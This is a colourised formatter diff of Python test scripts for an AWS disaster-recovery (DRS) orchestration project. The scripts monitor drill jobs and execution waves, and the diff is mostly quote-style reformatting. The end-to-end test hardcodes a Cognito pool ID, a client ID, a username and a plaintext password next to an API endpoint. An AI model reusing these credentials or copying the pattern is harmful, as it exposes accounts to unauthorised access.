False\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print_section(\"STEP 4: Verify Recovery Instances\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     try:\n         response = drs.describe_recovery_instances()\n\u001b[31m-        recovery_instances = response.get('items', [])\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        recovery_instances = response.get(\"items\", [])\u001b[0m\n\u001b[32m+\u001b[0m\n         print(f\"Found {len(recovery_instances)} recovery instances\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         for ri in recovery_instances:\n\u001b[31m-            sid = ri.get('sourceServerID')\u001b[0m\n\u001b[32m+            sid = ri.get(\"sourceServerID\")\u001b[0m\n             if sid in SOURCE_SERVER_IDS:\n\u001b[31m-                ec2_id = ri.get('ec2InstanceID')\u001b[0m\n\u001b[31m-                state = ri.get('ec2InstanceState')\u001b[0m\n\u001b[31m-                \u001b[0m\n\u001b[32m+                ec2_id = ri.get(\"ec2InstanceID\")\u001b[0m\n\u001b[32m+                state = ri.get(\"ec2InstanceState\")\u001b[0m\n\u001b[32m+\u001b[0m\n                 print(f\"\\n  {sid}:\")\n                 print(f\"    EC2 Instance: {ec2_id}\")\n                 print(f\"    State: {state}\")\n\u001b[31m-                print(f\"    Recovery Instance ID: {ri.get('recoveryInstanceID')}\")\u001b[0m\n\u001b[31m-                \u001b[0m\n\u001b[32m+                print(\u001b[0m\n\u001b[32m+                    f\"    Recovery Instance ID: {ri.get('recoveryInstanceID')}\"\u001b[0m\n\u001b[32m+                )\u001b[0m\n\u001b[32m+\u001b[0m\n                 if not ec2_id:\n                     print(f\"    \u2717 NO EC2 INSTANCE CREATED\")\n                     return False\n                 else:\n                     print(f\"    \u2713 EC2 instance exists\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         return True\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n     except Exception as e:\n         print(f\"\u2717 Failed to describe recovery instances: {e}\")\n         return False\n \n\u001b[31m-if __name__ == '__main__':\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+if __name__ == \"__main__\":\u001b[0m\n     print_section(\"DRS DRILL TRACE TEST\")\n     print(f\"Region: {REGION}\")\n     print(f\"Source Servers: {SOURCE_SERVER_IDS}\")\n     print(f\"Drill Mode: {IS_DRILL}\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     success = test_drs_recovery()\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print_section(\"TEST RESULT\")\n     if success:\n         print(\"\u2713 TEST PASSED - Recovery instances created successfully\")\n         sys.exit(0)\n     else:\n\u001b[1m--- tests/python/monitor_drs_drill.py\t2025-11-30 05:34:16.021817+00:00\u001b[0m\n\u001b[1m+++ tests/python/monitor_drs_drill.py\t2026-01-02 15:49:03.525598+00:00\u001b[0m\n\u001b[36m@@ -7,157 +7,169 @@\u001b[0m\n import boto3\n import json\n import time\n from datetime import datetime\n \n\u001b[32m+\u001b[0m\n def monitor_drill(job_id, timeout=1200):\n     \"\"\"Monitor DRS drill job with 30s polling\"\"\"\n\u001b[31m-    drs = boto3.client('drs', region_name='us-east-1')\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[31m-    print('=' * 80)\u001b[0m\n\u001b[31m-    print('DRS DRILL MONITORING')\u001b[0m\n\u001b[31m-    print('=' * 80)\u001b[0m\n\u001b[31m-    print(f'Job ID: {job_id}')\u001b[0m\n\u001b[31m-    print(f'Polling every 30s (timeout: {timeout}s / {timeout//60}min)')\u001b[0m\n\u001b[32m+    drs = boto3.client(\"drs\", region_name=\"us-east-1\")\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    print(\"=\" * 80)\u001b[0m\n\u001b[32m+    print(\"DRS DRILL MONITORING\")\u001b[0m\n\u001b[32m+    print(\"=\" * 80)\u001b[0m\n\u001b[32m+    print(f\"Job ID: {job_id}\")\u001b[0m\n\u001b[32m+    print(f\"Polling every 30s (timeout: {timeout}s / {timeout//60}min)\")\u001b[0m\n     print()\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     start_time = time.time()\n     poll_count = 0\n     previous_status = None\n     status_changes = []\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     results = {\n\u001b[31m-        'job_id': job_id,\u001b[0m\n\u001b[31m-        'start_time': datetime.now().isoformat(),\u001b[0m\n\u001b[31m-        'polls': [],\u001b[0m\n\u001b[31m-        'status_changes': [],\u001b[0m\n\u001b[31m-        'final_status': None,\u001b[0m\n\u001b[31m-        'recovery_instance_id': None,\u001b[0m\n\u001b[31m-        'elapsed_time': 0\u001b[0m\n\u001b[32m+        \"job_id\": job_id,\u001b[0m\n\u001b[32m+        \"start_time\": datetime.now().isoformat(),\u001b[0m\n\u001b[32m+        \"polls\": [],\u001b[0m\n\u001b[32m+        \"status_changes\": [],\u001b[0m\n\u001b[32m+        \"final_status\": None,\u001b[0m\n\u001b[32m+        \"recovery_instance_id\": None,\u001b[0m\n\u001b[32m+        \"elapsed_time\": 0,\u001b[0m\n     }\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     try:\n         while time.time() - start_time < timeout:\n             poll_count += 1\n             elapsed = int(time.time() - start_time)\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Query job status\n\u001b[31m-            response = drs.describe_jobs(filters={'jobIDs': [job_id]})\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[31m-            if not response.get('items'):\u001b[0m\n\u001b[31m-                print(f'\u274c Job not found: {job_id}')\u001b[0m\n\u001b[31m-                results['error'] = 'Job not found'\u001b[0m\n\u001b[32m+            response = drs.describe_jobs(filters={\"jobIDs\": [job_id]})\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+            if not response.get(\"items\"):\u001b[0m\n\u001b[32m+                print(f\"\u274c Job not found: {job_id}\")\u001b[0m\n\u001b[32m+                results[\"error\"] = \"Job not found\"\u001b[0m\n                 break\n\u001b[31m-            \u001b[0m\n\u001b[31m-            job = response['items'][0]\u001b[0m\n\u001b[31m-            job_status = job.get('status')\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+            job = response[\"items\"][0]\u001b[0m\n\u001b[32m+            job_status = job.get(\"status\")\u001b[0m\n\u001b[32m+\u001b[0m\n             # Print status\n\u001b[31m-            timestamp = datetime.now().strftime('%H:%M:%S')\u001b[0m\n\u001b[31m-            print(f'[{timestamp}] Poll #{poll_count} (T+{elapsed}s): {job_status}')\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+            timestamp = datetime.now().strftime(\"%H:%M:%S\")\u001b[0m\n\u001b[32m+            print(\u001b[0m\n\u001b[32m+                f\"[{timestamp}] Poll #{poll_count} (T+{elapsed}s): {job_status}\"\u001b[0m\n\u001b[32m+            )\u001b[0m\n\u001b[32m+\u001b[0m\n             # Show servers\n\u001b[31m-            servers = job.get('participatingServers', [])\u001b[0m\n\u001b[32m+            servers = job.get(\"participatingServers\", [])\u001b[0m\n             for server in servers:\n\u001b[31m-                srv_id = server.get('sourceServerID')\u001b[0m\n\u001b[31m-                launch_status = server.get('launchStatus', 'N/A')\u001b[0m\n\u001b[31m-                rec_id = server.get('recoveryInstanceID')\u001b[0m\n\u001b[31m-                print(f'  {srv_id}: {launch_status}', end='')\u001b[0m\n\u001b[32m+                srv_id = server.get(\"sourceServerID\")\u001b[0m\n\u001b[32m+                launch_status = server.get(\"launchStatus\", \"N/A\")\u001b[0m\n\u001b[32m+                rec_id = server.get(\"recoveryInstanceID\")\u001b[0m\n\u001b[32m+                print(f\"  {srv_id}: {launch_status}\", end=\"\")\u001b[0m\n                 if rec_id:\n\u001b[31m-                    print(f' \u2192 {rec_id}')\u001b[0m\n\u001b[31m-                    results['recovery_instance_id'] = rec_id\u001b[0m\n\u001b[32m+                    print(f\" \u2192 {rec_id}\")\u001b[0m\n\u001b[32m+                    results[\"recovery_instance_id\"] = rec_id\u001b[0m\n                 else:\n                     print()\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Track status change\n             if job_status != previous_status:\n                 change = f'{previous_status or \"INIT\"} \u2192 {job_status}'\n\u001b[31m-                print(f'  \ud83d\udcca STATUS CHANGE: {change}')\u001b[0m\n\u001b[31m-                status_changes.append({\u001b[0m\n\u001b[31m-                    'timestamp': datetime.now().isoformat(),\u001b[0m\n\u001b[31m-                    'elapsed': elapsed,\u001b[0m\n\u001b[31m-                    'change': change\u001b[0m\n\u001b[31m-                })\u001b[0m\n\u001b[32m+                print(f\"  \ud83d\udcca STATUS CHANGE: {change}\")\u001b[0m\n\u001b[32m+                status_changes.append(\u001b[0m\n\u001b[32m+                    {\u001b[0m\n\u001b[32m+                        \"timestamp\": datetime.now().isoformat(),\u001b[0m\n\u001b[32m+                        \"elapsed\": elapsed,\u001b[0m\n\u001b[32m+                        \"change\": change,\u001b[0m\n\u001b[32m+                    }\u001b[0m\n\u001b[32m+                )\u001b[0m\n             previous_status = job_status\n             print()\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Save poll data\n\u001b[31m-            results['polls'].append({\u001b[0m\n\u001b[31m-                'poll_num': poll_count,\u001b[0m\n\u001b[31m-                'elapsed': elapsed,\u001b[0m\n\u001b[31m-                'status': job_status,\u001b[0m\n\u001b[31m-                'servers': [{\u001b[0m\n\u001b[31m-                    'sourceServerID': s.get('sourceServerID'),\u001b[0m\n\u001b[31m-                    'launchStatus': s.get('launchStatus'),\u001b[0m\n\u001b[31m-                    'recoveryInstanceID': s.get('recoveryInstanceID')\u001b[0m\n\u001b[31m-                } for s in servers]\u001b[0m\n\u001b[31m-            })\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+            results[\"polls\"].append(\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"poll_num\": poll_count,\u001b[0m\n\u001b[32m+                    \"elapsed\": elapsed,\u001b[0m\n\u001b[32m+                    \"status\": job_status,\u001b[0m\n\u001b[32m+                    \"servers\": [\u001b[0m\n\u001b[32m+                        {\u001b[0m\n\u001b[32m+                            \"sourceServerID\": s.get(\"sourceServerID\"),\u001b[0m\n\u001b[32m+                            \"launchStatus\": s.get(\"launchStatus\"),\u001b[0m\n\u001b[32m+                            \"recoveryInstanceID\": s.get(\"recoveryInstanceID\"),\u001b[0m\n\u001b[32m+                        }\u001b[0m\n\u001b[32m+                        for s in servers\u001b[0m\n\u001b[32m+                    ],\u001b[0m\n\u001b[32m+                }\u001b[0m\n\u001b[32m+            )\u001b[0m\n\u001b[32m+\u001b[0m\n             # Check completion\n\u001b[31m-            if job_status == 'COMPLETED':\u001b[0m\n\u001b[31m-                print('=' * 80)\u001b[0m\n\u001b[31m-                print('\u2705 JOB COMPLETED SUCCESSFULLY!')\u001b[0m\n\u001b[31m-                print('=' * 80)\u001b[0m\n\u001b[31m-                results['final_status'] = 'COMPLETED'\u001b[0m\n\u001b[31m-                results['elapsed_time'] = elapsed\u001b[0m\n\u001b[31m-                results['status_changes'] = status_changes\u001b[0m\n\u001b[31m-                \u001b[0m\n\u001b[32m+            if job_status == \"COMPLETED\":\u001b[0m\n\u001b[32m+                print(\"=\" * 80)\u001b[0m\n\u001b[32m+                print(\"\u2705 JOB COMPLETED SUCCESSFULLY!\")\u001b[0m\n\u001b[32m+                print(\"=\" * 80)\u001b[0m\n\u001b[32m+                results[\"final_status\"] = \"COMPLETED\"\u001b[0m\n\u001b[32m+                results[\"elapsed_time\"] = elapsed\u001b[0m\n\u001b[32m+                results[\"status_changes\"] = status_changes\u001b[0m\n\u001b[32m+\u001b[0m\n                 # Save full job details\n\u001b[31m-                results['final_job'] = json.loads(json.dumps(job, default=str))\u001b[0m\n\u001b[32m+                results[\"final_job\"] = json.loads(json.dumps(job, default=str))\u001b[0m\n                 break\n\u001b[31m-                \u001b[0m\n\u001b[31m-            elif job_status == 'FAILED':\u001b[0m\n\u001b[31m-                print('=' * 80)\u001b[0m\n\u001b[31m-                print('\u274c JOB FAILED!')\u001b[0m\n\u001b[31m-                print('=' * 80)\u001b[0m\n\u001b[31m-                results['final_status'] = 'FAILED'\u001b[0m\n\u001b[31m-                results['elapsed_time'] = elapsed\u001b[0m\n\u001b[31m-                results['status_changes'] = status_changes\u001b[0m\n\u001b[31m-                results['final_job'] = json.loads(json.dumps(job, default=str))\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+            elif job_status == \"FAILED\":\u001b[0m\n\u001b[32m+                print(\"=\" * 80)\u001b[0m\n\u001b[32m+                print(\"\u274c JOB FAILED!\")\u001b[0m\n\u001b[32m+                print(\"=\" * 80)\u001b[0m\n\u001b[32m+                results[\"final_status\"] = \"FAILED\"\u001b[0m\n\u001b[32m+                results[\"elapsed_time\"] = elapsed\u001b[0m\n\u001b[32m+                results[\"status_changes\"] = status_changes\u001b[0m\n\u001b[32m+                results[\"final_job\"] = json.loads(json.dumps(job, default=str))\u001b[0m\n                 break\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Wait 30s before next poll\n             time.sleep(30)\n         else:\n             # Timeout reached\n\u001b[31m-            print(f'\u23f1\ufe0f Timeout after {timeout}s')\u001b[0m\n\u001b[31m-            results['final_status'] = f'TIMEOUT at {job_status}'\u001b[0m\n\u001b[31m-            results['elapsed_time'] = timeout\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+            print(f\"\u23f1\ufe0f Timeout after {timeout}s\")\u001b[0m\n\u001b[32m+            results[\"final_status\"] = f\"TIMEOUT at {job_status}\"\u001b[0m\n\u001b[32m+            results[\"elapsed_time\"] = timeout\u001b[0m\n\u001b[32m+\u001b[0m\n     except Exception as e:\n\u001b[31m-        print(f'\u274c Error: {e}')\u001b[0m\n\u001b[31m-        results['error'] = str(e)\u001b[0m\n\u001b[32m+        print(f\"\u274c Error: {e}\")\u001b[0m\n\u001b[32m+        results[\"error\"] = str(e)\u001b[0m\n         import traceback\n\u001b[32m+\u001b[0m\n         traceback.print_exc()\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Write results\n\u001b[31m-    results_file = f'/tmp/drs_drill_results_{job_id}.json'\u001b[0m\n\u001b[31m-    with open(results_file, 'w') as f:\u001b[0m\n\u001b[32m+    results_file = f\"/tmp/drs_drill_results_{job_id}.json\"\u001b[0m\n\u001b[32m+    with open(results_file, \"w\") as f:\u001b[0m\n         json.dump(results, f, indent=2)\n     print()\n\u001b[31m-    print(f'Results saved: {results_file}')\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+    print(f\"Results saved: {results_file}\")\u001b[0m\n\u001b[32m+\u001b[0m\n     # Also write recovery instance ID if available\n\u001b[31m-    if results.get('recovery_instance_id'):\u001b[0m\n\u001b[31m-        with open('/tmp/drs_recovery_instance_id.txt', 'w') as f:\u001b[0m\n\u001b[31m-            f.write(results['recovery_instance_id'])\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+    if results.get(\"recovery_instance_id\"):\u001b[0m\n\u001b[32m+        with open(\"/tmp/drs_recovery_instance_id.txt\", \"w\") as f:\u001b[0m\n\u001b[32m+            f.write(results[\"recovery_instance_id\"])\u001b[0m\n\u001b[32m+\u001b[0m\n     return results\n \n\u001b[31m-if __name__ == '__main__':\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+if __name__ == \"__main__\":\u001b[0m\n     # Read job ID from temp file\n\u001b[31m-    with open('/tmp/drs_drill_job_id.txt', 'r') as f:\u001b[0m\n\u001b[32m+    with open(\"/tmp/drs_drill_job_id.txt\", \"r\") as f:\u001b[0m\n         job_id = f.read().strip()\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     results = monitor_drill(job_id)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Print summary\n     print()\n\u001b[31m-    print('=' * 80)\u001b[0m\n\u001b[31m-    print('MONITORING COMPLETE')\u001b[0m\n\u001b[31m-    print('=' * 80)\u001b[0m\n\u001b[32m+    print(\"=\" * 80)\u001b[0m\n\u001b[32m+    print(\"MONITORING COMPLETE\")\u001b[0m\n\u001b[32m+    print(\"=\" * 80)\u001b[0m\n     print(f'Final Status: {results.get(\"final_status\")}')\n     print(f'Total Time: {results.get(\"elapsed_time\")}s')\n     print(f'Polls: {len(results.get(\"polls\", []))}')\n     print(f'Status Changes: {len(results.get(\"status_changes\", []))}')\n\u001b[31m-    if results.get('recovery_instance_id'):\u001b[0m\n\u001b[32m+    if results.get(\"recovery_instance_id\"):\u001b[0m\n         print(f'Recovery Instance: {results.get(\"recovery_instance_id\")}')\n\u001b[1m--- tests/python/monitor_execution.py\t2025-12-06 20:33:26.267757+00:00\u001b[0m\n\u001b[1m+++ tests/python/monitor_execution.py\t2026-01-02 15:49:03.525970+00:00\u001b[0m\n\u001b[36m@@ -6,111 +6,126 @@\u001b[0m\n import boto3\n import time\n import sys\n from datetime import datetime\n \n\u001b[31m-def monitor_execution(execution_id: str, region: str = 'us-east-1'):\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+def monitor_execution(execution_id: str, region: str = \"us-east-1\"):\u001b[0m\n     \"\"\"Monitor execution until completion\"\"\"\n\u001b[31m-    dynamodb = boto3.client('dynamodb', region_name=region)\u001b[0m\n\u001b[31m-    drs = boto3.client('drs', region_name=region)\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[31m-    table_name = 'drs-orchestration-execution-history-test'\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+    dynamodb = boto3.client(\"dynamodb\", region_name=region)\u001b[0m\n\u001b[32m+    drs = boto3.client(\"drs\", region_name=region)\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    table_name = \"drs-orchestration-execution-history-test\"\u001b[0m\n\u001b[32m+\u001b[0m\n     print(f\"Monitoring execution: {execution_id}\")\n     print(\"=\" * 80)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     last_status = None\n     wave_statuses = {}\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     while True:\n         try:\n             # Get execution from StatusIndex\n             response = dynamodb.query(\n                 TableName=table_name,\n\u001b[31m-                IndexName='StatusIndex',\u001b[0m\n\u001b[31m-                KeyConditionExpression='#status = :status',\u001b[0m\n\u001b[31m-                ExpressionAttributeNames={'#status': 'Status'},\u001b[0m\n\u001b[31m-                ExpressionAttributeValues={':status': {'S': 'POLLING'}},\u001b[0m\n\u001b[31m-                FilterExpression='ExecutionId = :exec_id',\u001b[0m\n\u001b[32m+                IndexName=\"StatusIndex\",\u001b[0m\n\u001b[32m+                KeyConditionExpression=\"#status = :status\",\u001b[0m\n\u001b[32m+                ExpressionAttributeNames={\"#status\": \"Status\"},\u001b[0m\n\u001b[32m+                ExpressionAttributeValues={\":status\": {\"S\": \"POLLING\"}},\u001b[0m\n\u001b[32m+                FilterExpression=\"ExecutionId = :exec_id\",\u001b[0m\n                 ExpressionAttributeValues={\n\u001b[31m-                    ':status': {'S': 'POLLING'},\u001b[0m\n\u001b[31m-                    ':exec_id': {'S': execution_id}\u001b[0m\n\u001b[31m-                }\u001b[0m\n\u001b[32m+                    \":status\": {\"S\": \"POLLING\"},\u001b[0m\n\u001b[32m+                    \":exec_id\": {\"S\": execution_id},\u001b[0m\n\u001b[32m+                },\u001b[0m\n             )\n\u001b[31m-            \u001b[0m\n\u001b[31m-            if not response.get('Items'):\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+            if not response.get(\"Items\"):\u001b[0m\n                 # Check if completed\n                 response = dynamodb.query(\n                     TableName=table_name,\n\u001b[31m-                    IndexName='StatusIndex',\u001b[0m\n\u001b[31m-                    KeyConditionExpression='#status = :status',\u001b[0m\n\u001b[31m-                    ExpressionAttributeNames={'#status': 'Status'},\u001b[0m\n\u001b[31m-                    ExpressionAttributeValues={':status': {'S': 'COMPLETED'}},\u001b[0m\n\u001b[31m-                    FilterExpression='ExecutionId = :exec_id',\u001b[0m\n\u001b[32m+                    IndexName=\"StatusIndex\",\u001b[0m\n\u001b[32m+                    KeyConditionExpression=\"#status = :status\",\u001b[0m\n\u001b[32m+                    ExpressionAttributeNames={\"#status\": \"Status\"},\u001b[0m\n\u001b[32m+                    ExpressionAttributeValues={\":status\": {\"S\": \"COMPLETED\"}},\u001b[0m\n\u001b[32m+                    FilterExpression=\"ExecutionId = :exec_id\",\u001b[0m\n                     ExpressionAttributeValues={\n\u001b[31m-                        ':status': {'S': 'COMPLETED'},\u001b[0m\n\u001b[31m-                        ':exec_id': {'S': execution_id}\u001b[0m\n\u001b[31m-                    }\u001b[0m\n\u001b[32m+                        \":status\": {\"S\": \"COMPLETED\"},\u001b[0m\n\u001b[32m+                        \":exec_id\": {\"S\": execution_id},\u001b[0m\n\u001b[32m+                    },\u001b[0m\n                 )\n\u001b[31m-                \u001b[0m\n\u001b[31m-                if response.get('Items'):\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+                if response.get(\"Items\"):\u001b[0m\n                     print(\"\\n\u2705 EXECUTION COMPLETED!\")\n                     break\n                 else:\n                     print(\"\\n\u26a0\ufe0f  Execution not found or in unknown state\")\n                     break\n\u001b[31m-            \u001b[0m\n\u001b[31m-            item = response['Items'][0]\u001b[0m\n\u001b[31m-            status = item.get('Status', {}).get('S', 'UNKNOWN')\u001b[0m\n\u001b[31m-            waves = item.get('Waves', {}).get('L', [])\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+            item = response[\"Items\"][0]\u001b[0m\n\u001b[32m+            status = item.get(\"Status\", {}).get(\"S\", \"UNKNOWN\")\u001b[0m\n\u001b[32m+            waves = item.get(\"Waves\", {}).get(\"L\", [])\u001b[0m\n\u001b[32m+\u001b[0m\n             # Print status update\n             if status != last_status:\n\u001b[31m-                print(f\"\\n[{datetime.now().strftime('%H:%M:%S')}] Overall Status: {status}\")\u001b[0m\n\u001b[32m+                print(\u001b[0m\n\u001b[32m+                    f\"\\n[{datetime.now().strftime('%H:%M:%S')}] Overall Status: {status}\"\u001b[0m\n\u001b[32m+                )\u001b[0m\n                 last_status = status\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Print wave statuses\n             for wave in waves:\n\u001b[31m-                wave_data = wave.get('M', {})\u001b[0m\n\u001b[31m-                wave_id = wave_data.get('WaveId', {}).get('N', 'unknown')\u001b[0m\n\u001b[31m-                wave_status = wave_data.get('Status', {}).get('S', 'UNKNOWN')\u001b[0m\n\u001b[31m-                job_id = wave_data.get('JobId', {}).get('S', '')\u001b[0m\n\u001b[31m-                \u001b[0m\n\u001b[32m+                wave_data = wave.get(\"M\", {})\u001b[0m\n\u001b[32m+                wave_id = wave_data.get(\"WaveId\", {}).get(\"N\", \"unknown\")\u001b[0m\n\u001b[32m+                wave_status = wave_data.get(\"Status\", {}).get(\"S\", \"UNKNOWN\")\u001b[0m\n\u001b[32m+                job_id = wave_data.get(\"JobId\", {}).get(\"S\", \"\")\u001b[0m\n\u001b[32m+\u001b[0m\n                 wave_key = f\"wave_{wave_id}\"\n\u001b[31m-                if wave_key not in wave_statuses or wave_statuses[wave_key] != wave_status:\u001b[0m\n\u001b[32m+                if (\u001b[0m\n\u001b[32m+                    wave_key not in wave_statuses\u001b[0m\n\u001b[32m+                    or wave_statuses[wave_key] != wave_status\u001b[0m\n\u001b[32m+                ):\u001b[0m\n                     wave_statuses[wave_key] = wave_status\n\u001b[31m-                    \u001b[0m\n\u001b[32m+\u001b[0m\n                     # Get server count\n\u001b[31m-                    servers = wave_data.get('Servers', {}).get('L', [])\u001b[0m\n\u001b[32m+                    servers = wave_data.get(\"Servers\", {}).get(\"L\", [])\u001b[0m\n                     server_count = len(servers)\n\u001b[31m-                    \u001b[0m\n\u001b[32m+\u001b[0m\n                     # Count launched servers\n\u001b[31m-                    launched = sum(1 for s in servers \u001b[0m\n\u001b[31m-                                 if s.get('M', {}).get('Status', {}).get('S') == 'LAUNCHED')\u001b[0m\n\u001b[31m-                    \u001b[0m\n\u001b[32m+                    launched = sum(\u001b[0m\n\u001b[32m+                        1\u001b[0m\n\u001b[32m+                        for s in servers\u001b[0m\n\u001b[32m+                        if s.get(\"M\", {}).get(\"Status\", {}).get(\"S\")\u001b[0m\n\u001b[32m+                        == \"LAUNCHED\"\u001b[0m\n\u001b[32m+                    )\u001b[0m\n\u001b[32m+\u001b[0m\n                     status_icon = \"\u2705\" if wave_status == \"COMPLETED\" else \"\u23f3\"\n\u001b[31m-                    print(f\"  {status_icon} Wave {wave_id}: {wave_status} ({launched}/{server_count} servers)\")\u001b[0m\n\u001b[31m-                    \u001b[0m\n\u001b[32m+                    print(\u001b[0m\n\u001b[32m+                        f\"  {status_icon} Wave {wave_id}: {wave_status} ({launched}/{server_count} servers)\"\u001b[0m\n\u001b[32m+                    )\u001b[0m\n\u001b[32m+\u001b[0m\n                     if job_id:\n                         print(f\"     Job: {job_id}\")\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Sleep before next poll\n             time.sleep(10)\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n         except KeyboardInterrupt:\n             print(\"\\n\\nMonitoring stopped by user\")\n             break\n         except Exception as e:\n             print(f\"\\nError: {str(e)}\")\n             time.sleep(10)\n \n\u001b[31m-if __name__ == '__main__':\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+if __name__ == \"__main__\":\u001b[0m\n     if len(sys.argv) < 2:\n         print(\"Usage: python3 monitor_execution.py <execution-id>\")\n         print(\"\\nExample:\")\n\u001b[31m-        print(\"  python3 monitor_execution.py 79d6f9cd-c092-437c-82e9-6ec47f42982b\")\u001b[0m\n\u001b[32m+        print(\u001b[0m\n\u001b[32m+            \"  python3 monitor_execution.py 79d6f9cd-c092-437c-82e9-6ec47f42982b\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n         sys.exit(1)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     execution_id = sys.argv[1]\n\u001b[31m-    region = sys.argv[2] if len(sys.argv) > 2 else 'us-east-1'\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+    region = sys.argv[2] if len(sys.argv) > 2 else \"us-east-1\"\u001b[0m\n\u001b[32m+\u001b[0m\n     monitor_execution(execution_id, region)\n\u001b[1m--- tests/python/e2e/test_recovery_plan_e2e.py\t2025-11-21 02:56:07.794884+00:00\u001b[0m\n\u001b[1m+++ tests/python/e2e/test_recovery_plan_e2e.py\t2026-01-02 15:49:03.538785+00:00\u001b[0m\n\u001b[36m@@ -8,69 +8,70 @@\u001b[0m\n import json\n import sys\n import time\n \n # Config\n\u001b[31m-USER_POOL_ID = 'us-east-1_S3wvMGaT0'\u001b[0m\n\u001b[31m-CLIENT_ID = '31jqv7bghmie564eehjpgqf2tr'\u001b[0m\n\u001b[31m-USERNAME = 'apitest@example.com'\u001b[0m\n\u001b[31m-PASSWORD = 'ApiTest123!'\u001b[0m\n\u001b[31m-API_ENDPOINT = 'https://19rzo4z35f.execute-api.us-east-1.amazonaws.com/test'\u001b[0m\n\u001b[32m+USER_POOL_ID = \"us-east-1_S3wvMGaT0\"\u001b[0m\n\u001b[32m+CLIENT_ID = \"31jqv7bghmie564eehjpgqf2tr\"\u001b[0m\n\u001b[32m+USERNAME = \"apitest@example.com\"\u001b[0m\n\u001b[32m+PASSWORD = \"ApiTest123!\"\u001b[0m\n\u001b[32m+API_ENDPOINT = \"https://19rzo4z35f.execute-api.us-east-1.amazonaws.com/test\"\u001b[0m\n\u001b[32m+\u001b[0m\n \n def get_auth_token():\n     \"\"\"Get Cognito ID token\"\"\"\n     try:\n\u001b[31m-        client = boto3.client('cognito-idp', region_name='us-east-1')\u001b[0m\n\u001b[32m+        client = boto3.client(\"cognito-idp\", region_name=\"us-east-1\")\u001b[0m\n         response = client.initiate_auth(\n             ClientId=CLIENT_ID,\n\u001b[31m-            AuthFlow='USER_PASSWORD_AUTH',\u001b[0m\n\u001b[31m-            AuthParameters={\u001b[0m\n\u001b[31m-                'USERNAME': USERNAME,\u001b[0m\n\u001b[31m-                'PASSWORD': PASSWORD\u001b[0m\n\u001b[31m-            }\u001b[0m\n\u001b[32m+            AuthFlow=\"USER_PASSWORD_AUTH\",\u001b[0m\n\u001b[32m+            AuthParameters={\"USERNAME\": USERNAME, \"PASSWORD\": PASSWORD},\u001b[0m\n         )\n\u001b[31m-        return response['AuthenticationResult']['IdToken']\u001b[0m\n\u001b[32m+        return response[\"AuthenticationResult\"][\"IdToken\"]\u001b[0m\n     except Exception as e:\n         print(f\"\u274c Auth failed: {e}\")\n         return None\n \n\u001b[32m+\u001b[0m\n def test_1_create_recovery_plan(token):\n     \"\"\"\n     Test 1: Create Recovery Plan with 3 waves\n     - Wave 1: Web (WebServers, 2 servers)\n\u001b[31m-    - Wave 2: App (AppServers, 2 servers)  \u001b[0m\n\u001b[32m+    - Wave 2: App (AppServers, 2 servers)\u001b[0m\n     - Wave 3: Database (DatabaseServers, 2 servers)\n     \"\"\"\n     print(\"\\n\" + \"=\" * 60)\n     print(\"TEST 1: CREATE RECOVERY PLAN\")\n     print(\"=\" * 60)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Get Protection Groups first\n     print(\"\\n\ud83d\udccb Step 1: Fetching Protection Groups...\")\n\u001b[31m-    headers = {'Authorization': f'Bearer {token}'}\u001b[0m\n\u001b[31m-    pg_response = requests.get(f'{API_ENDPOINT}/protection-groups', 